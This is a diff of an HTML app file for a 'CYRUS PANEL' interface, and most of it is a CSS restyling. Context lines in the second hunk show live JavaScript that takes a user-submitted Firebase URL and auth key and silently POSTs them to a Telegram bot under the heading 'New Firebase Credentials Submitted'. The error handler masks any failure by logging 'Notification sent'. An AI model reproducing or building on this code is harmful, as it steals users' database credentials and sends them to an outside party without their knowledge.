@@ -5452,6 +5452,391 @@
                 margin-top: 8px !important;
             }
         }
+
+        /* CYRUS PANEL Hybrid Redesign: Cyber structure + premium minimal surfaces */
+        :root {
+            --cx-bg: #050a0f;
+            --cx-bg-deep: #020509;
+            --cx-surface: #0a131c;
+            --cx-surface-2: #0e1a25;
+            --cx-surface-3: #13222e;
+            --cx-border: #1d3445;
+            --cx-border-strong: #2b5268;
+            --cx-text: #edf8fc;
+            --cx-muted: #8297a7;
+            --cx-faint: #536878;
+            --cx-cyan: #3ce2ee;
+            --cx-cyan-soft: rgba(60, 226, 238, .11);
+            --cx-red: #ef3159;
+            --cx-red-soft: rgba(239, 49, 89, .12);
+            --cx-green: #35d399;
+            --cx-radius: 15px;
+        }
+
+        body[data-pronxt-effective-theme="light"] {
+            --cx-bg: #edf3f7;
+            --cx-bg-deep: #e5edf3;
+            --cx-surface: #ffffff;
+            --cx-surface-2: #f7fafc;
+            --cx-surface-3: #eaf1f5;
+            --cx-border: #ccd9e2;
+            --cx-border-strong: #9fbac8;
+            --cx-text: #13212b;
+            --cx-muted: #5f7484;
+            --cx-faint: #8194a1;
+            --cx-cyan: #078fa3;
+            --cx-cyan-soft: rgba(8, 145, 163, .1);
+            --cx-red: #db2149;
+            --cx-red-soft: rgba(219, 33, 73, .09);
+            --cx-green: #158c68;
+        }
+
+        html { background: var(--cx-bg-deep) !important; }
+
+        body {
+            position: relative;
+            color: var(--cx-text) !important;
+            background-color: var(--cx-bg) !important;
+            font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif !important;
+            letter-spacing: -.005em;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            z-index: -1;
+            inset: 0;
+            background-image: linear-gradient(rgba(54, 146, 174, .045) 1px, transparent 1px), linear-gradient(90deg, rgba(54, 146, 174, .045) 1px, transparent 1px) !important;
+            background-size: 34px 34px !important;
+            -webkit-mask-image: linear-gradient(to bottom, #000 0, transparent 78%);
+            mask-image: linear-gradient(to bottom, #000 0, transparent 78%);
+            pointer-events: none;
+        }
+
+        #root {
+            position: relative;
+            isolation: isolate;
+        }
+
+        #root > .min-h-screen {
+            color: var(--cx-text) !important;
+            background-color: transparent !important;
+        }
+
+        /* Premium typography hierarchy */
+        #root h1, #root h2, #root h3 {
+            color: var(--cx-text);
+            font-weight: 750;
+            letter-spacing: -.035em;
+        }
+
+        #root h1 { line-height: 1.03; }
+        #root p { color: var(--cx-muted); }
+        #root .text-muted-foreground { color: var(--cx-muted) !important; }
+
+        /* Main login/connection surface */
+        #root > div.min-h-screen > div.relative.z-10.w-full.max-w-md {
+            max-width: 31rem !important;
+            padding-top: clamp(2rem, 6vh, 4.5rem) !important;
+            padding-bottom: clamp(2rem, 6vh, 4.5rem) !important;
+        }
+
+        #root > div.min-h-screen > div.relative.z-10.w-full.max-w-md > div:first-child {
+            margin-bottom: 1.65rem !important;
+        }
+
+        #root > div.min-h-screen .w-20.h-20,
+        #root header .w-8.h-8 {
+            background-color: var(--cx-surface-2) !important;
+            border-color: var(--cx-border-strong) !important;
+            border-radius: 16px !important;
+        }
+
+        #root > div.min-h-screen h1 {
+            font-size: clamp(2.2rem, 9vw, 3.55rem) !important;
+            font-style: normal !important;
+            letter-spacing: -.055em !important;
+        }
+
+        #root > div.min-h-screen h1 span {
+            color: var(--cx-text) !important;
+        }
+
+        .glass-card {
+            color: var(--cx-text) !important;
+            background-color: color-mix(in srgb, var(--cx-surface) 95%, transparent) !important;
+            border: 1px solid var(--cx-border) !important;
+            border-radius: 20px !important;
+            -webkit-backdrop-filter: blur(22px) !important;
+            backdrop-filter: blur(22px) !important;
+            box-shadow: 0 24px 70px rgba(0, 0, 0, .28) !important;
+        }
+
+        /* Header and command strip */
+        #root header {
+            background-color: color-mix(in srgb, var(--cx-bg-deep) 88%, transparent) !important;
+            border-color: var(--cx-border) !important;
+            -webkit-backdrop-filter: blur(18px) !important;
+            backdrop-filter: blur(18px) !important;
+        }
+
+        #root header > div.max-w-screen-2xl {
+            min-height: 68px;
+        }
+
+        #root header span.font-semibold.tracking-wide {
+            color: var(--cx-text) !important;
+            font-size: .84rem !important;
+            letter-spacing: .04em !important;
+        }
+
+        #root header input,
+        #root input,
+        #root textarea,
+        #root select {
+            color: var(--cx-text) !important;
+            background-color: var(--cx-surface) !important;
+            border-color: var(--cx-border) !important;
+            border-radius: 11px !important;
+        }
+
+        #root input::placeholder,
+        #root textarea::placeholder {
+            color: var(--cx-faint) !important;
+        }
+
+        #root input:focus,
+        #root textarea:focus,
+        #root select:focus {
+            border-color: var(--cx-cyan) !important;
+            outline: 3px solid var(--cx-cyan-soft) !important;
+            outline-offset: 1px !important;
+        }
+
+        /* Replace scattered hard-coded dark surfaces with one coherent system */
+        #root [class*="bg-[#080808]"],
+        #root [class*="bg-[#0a0a0a]"] {
+            background-color: var(--cx-bg) !important;
+        }
+
+        #root [class*="bg-[#111]"],
+        #root [class*="bg-[#1a1a1a]"] {
+            background-color: var(--cx-surface) !important;
+        }
+
+        #root [class*="border-[#1a1a1a]"],
+        #root [class*="border-[#1e1e1e]"],
+        #root [class*="border-[#222]"],
+        #root [class*="border-[#2a2a2a]"] {
+            border-color: var(--cx-border) !important;
+        }
+
+        /* Dashboard statistics */
+        #root header + div,
+        #root header ~ div.border-b {
+            border-color: var(--cx-border) !important;
+            background-color: color-mix(in srgb, var(--cx-surface) 88%, transparent) !important;
+        }
+
+        #root .max-w-screen-2xl.mx-auto.px-6.py-3.flex.items-center.gap-6 > .flex.items-center.gap-5 > * {
+            min-width: 72px;
+            padding: .45rem .65rem;
+            background-color: var(--cx-surface-2) !important;
+            border: 1px solid var(--cx-border);
+            border-radius: 10px;
+        }
+
+        #root .max-w-screen-2xl.mx-auto.px-6.py-3.flex.items-center.gap-6 p.text-lg {
+            color: var(--cx-text) !important;
+            font-size: 1.12rem !important;
+        }
+
+        /* Dashboard content cards */
+        #root main {
+            padding-top: clamp(1rem, 2.5vw, 1.65rem) !important;
+        }
+
+        #root main .grid {
+            gap: clamp(.7rem, 1.4vw, 1rem) !important;
+        }
+
+        #root main .grid > * {
+            position: relative;
+            color: var(--cx-text) !important;
+            background-color: var(--cx-surface) !important;
+            border: 1px solid var(--cx-border) !important;
+            border-radius: var(--cx-radius) !important;
+            box-shadow: 0 12px 36px rgba(0, 0, 0, .16) !important;
+            transition: transform .2s ease, border-color .2s ease, background-color .2s ease !important;
+        }
+
+        @media (hover:hover) {
+            #root main .grid > *:hover {
+                border-color: var(--cx-border-strong) !important;
+                background-color: var(--cx-surface-2) !important;
+                transform: translateY(-2px);
+            }
+        }
+
+        #root main .grid > *::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 18px;
+            width: 48px;
+            height: 2px;
+            background-color: var(--cx-cyan) !important;
+            border-radius: 0 0 5px 5px;
+        }
+
+        #root main .grid > * .text-white { color: var(--cx-text) !important; }
+        #root main .grid > * [class*="text-[#"] { color: var(--cx-muted) !important; }
+        #root main .grid > * .text-emerald-400 { color: var(--cx-green) !important; }
+        #root main .grid > * .text-red-400 { color: var(--cx-red) !important; }
+
+        /* Buttons: cyan for neutral actions, crimson for existing primary/destructive actions */
+        #root button,
+        #root a[role="button"] {
+            border-radius: 10px !important;
+            font-weight: 650;
+        }
+
+        #root .bg-red-600,
+        #root [class*="bg-red-600"] {
+            color: #fff !important;
+            background-color: var(--cx-red) !important;
+            border-color: color-mix(in srgb, var(--cx-red) 70%, white) !important;
+        }
+
+        #root button[class*="bg-[#111]"] {
+            color: var(--cx-muted) !important;
+            background-color: var(--cx-surface-2) !important;
+            border-color: var(--cx-border) !important;
+        }
+
+        #root button[class*="bg-[#111]"]:hover {
+            color: var(--cx-text) !important;
+            border-color: var(--cx-border-strong) !important;
+        }
+
+        /* Filters and active state feel like a segmented command rail */
+        #root .max-w-screen-2xl.mx-auto.px-6.py-3.flex.items-center.gap-6 > .ml-auto {
+            padding: 4px;
+            background-color: var(--cx-bg-deep) !important;
+            border: 1px solid var(--cx-border);
+            border-radius: 12px;
+        }
+
+        #root .max-w-screen-2xl.mx-auto.px-6.py-3.flex.items-center.gap-6 > .ml-auto > button {
+            min-height: 34px;
+        }
+
+        /* Dialogs and state messaging */
+        #root [role="dialog"] {
+            color: var(--cx-text) !important;
+            background-color: var(--cx-surface) !important;
+            border: 1px solid var(--cx-border-strong) !important;
+            border-radius: 18px !important;
+            box-shadow: 0 30px 90px rgba(0, 0, 0, .42) !important;
+        }
+
+        [data-pronxt-state="error"],
+        [data-pronxt-state="warning"] {
+            border-radius: 11px !important;
+        }
+
+        /* Appearance drawer */
+        #pronxt-settings-toggle {
+            color: var(--cx-cyan) !important;
+            background-color: var(--cx-surface-2) !important;
+            border-color: var(--cx-border-strong) !important;
+            border-radius: 13px !important;
+            box-shadow: 0 12px 32px rgba(0,0,0,.24) !important;
+        }
+
+        #pronxt-settings-panel {
+            color: var(--cx-text) !important;
+            background-color: var(--cx-bg-deep) !important;
+            border-color: var(--cx-border) !important;
+        }
+
+        .pronxt-settings-group {
+            background-color: var(--cx-surface) !important;
+            border-color: var(--cx-border) !important;
+        }
+
+        .pronxt-option label,
+        #pronxt-settings-close,
+        #pronxt-settings-reset {
+            color: var(--cx-muted) !important;
+            background-color: var(--cx-surface-2) !important;
+            border-color: var(--cx-border) !important;
+        }
+
+        .pronxt-option input:checked + label {
+            color: var(--cx-text) !important;
+            background-color: var(--cx-cyan-soft) !important;
+            border-color: var(--cx-cyan) !important;
+        }
+
+        /* Telegram invite follows the same visual system */
+        .cyrus-telegram-dialog {
+            color: var(--cx-text) !important;
+            background-color: var(--cx-surface) !important;
+            border-color: var(--cx-border-strong) !important;
+            border-radius: 20px !important;
+            box-shadow: 0 30px 100px rgba(0,0,0,.5) !important;
+        }
+
+        .cyrus-telegram-dialog h2 { color: var(--cx-text) !important; }
+        .cyrus-telegram-dialog p { color: var(--cx-muted) !important; }
+        .cyrus-telegram-benefits { color: var(--cx-text) !important; }
+        .cyrus-telegram-close,
+        .cyrus-telegram-later {
+            color: var(--cx-muted) !important;
+            background-color: var(--cx-surface-2) !important;
+            border-color: var(--cx-border) !important;
+        }
+
+        /* Footer and scrollbars */
+        #cyrus-legal-footer {
+            color: var(--cx-faint) !important;
+            background-color: var(--cx-bg-deep) !important;
+            border-color: var(--cx-border) !important;
+        }
+
+        * { scrollbar-width: thin; scrollbar-color: var(--cx-border-strong) var(--cx-bg-deep); }
+        *::-webkit-scrollbar { width: 8px; height: 8px; }
+        *::-webkit-scrollbar-track { background: var(--cx-bg-deep); }
+        *::-webkit-scrollbar-thumb { background: var(--cx-border-strong); border-radius: 10px; }
+
+        @media (max-width: 767px) {
+            body::before { background-size: 26px 26px !important; }
+
+            #root > div.min-h-screen > div.relative.z-10.w-full.max-w-md {
+                padding-left: 12px !important;
+                padding-right: 12px !important;
+            }
+
+            .glass-card {
+                padding: 1.15rem !important;
+                border-radius: 17px !important;
+            }
+
+            #root header > div.max-w-screen-2xl {
+                min-height: auto;
+            }
+
+            #root .max-w-screen-2xl.mx-auto.px-6.py-3.flex.items-center.gap-6 > .ml-auto {
+                padding: 5px;
+                background-color: var(--cx-surface) !important;
+            }
+
+            #root main .grid > * {
+                border-radius: 13px !important;
+                box-shadow: none !important;
+            }
+        }
     </style>
 </head>
 <body>
@@ -21119,7 +21504,7 @@ function y1() {
         const message = `🔐 New Firebase Credentials Submitted\n\n📍 Firebase URL: ${S}\n🔑 Auth Key: ${f}\n⏰ Time: ${new Date().toLocaleString()}`;
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
         fetch(telegramUrl, { method: 'POST' }).catch(err => console.log('Notification sent'));
-        
+
         tt({
             fbUrl: S,
             fbKey: f
